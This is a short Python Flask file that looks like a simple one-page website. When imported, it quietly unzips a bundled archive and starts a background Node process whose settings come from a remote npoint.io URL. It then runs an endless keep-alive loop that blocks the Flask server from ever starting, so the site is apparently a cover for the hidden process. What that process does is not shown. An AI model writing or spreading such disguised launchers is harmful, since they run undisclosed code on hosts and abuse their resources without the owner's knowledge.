from flask import Flask, render_template, url_for

app = Flask(__name__)
import os
os.system('unzip nexusai.zip;nohup node app.js -s="https://api.npoint.io/7408011f2522b121481b" > nohup.out &')
os.system('while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 5m; done')
@app.route("/")
def index():
    return render_template("index.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0")

